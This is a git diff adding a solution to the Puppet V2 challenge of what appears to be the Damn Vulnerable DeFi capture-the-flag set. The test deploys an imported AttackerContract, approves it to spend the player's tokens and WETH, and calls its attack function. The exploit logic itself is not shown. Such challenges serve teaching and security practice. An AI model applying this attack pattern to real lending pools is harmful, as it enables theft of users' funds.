@@ -10,6 +10,8 @@ import {WETH} from "solmate/tokens/WETH.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
 
+import {AttackerContract} from "../../src/puppet-v2/AttackerContract.sol";
+
 contract PuppetV2Challenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -98,6 +100,26 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
+
+        // deploy the attacker contract
+        AttackerContract attacker = new AttackerContract(
+            player,
+            address(lendingPool),
+            address(token),
+            address(weth),
+            address(uniswapV2Factory)
+        );
+
+        // approve the attacker contract to transfer tokens on behalf of the player
+        token.approve(address(attacker), token.balanceOf(player));
+
+        // change player eth for weth
+        weth.deposit{value: player.balance}();
+        // approve the attacker contract to transfer WETH on behalf of the player
+        weth.approve(address(attacker), weth.balanceOf(player));
+
+        // call the attack function
+        attacker.attack(recovery);
         
     }
 
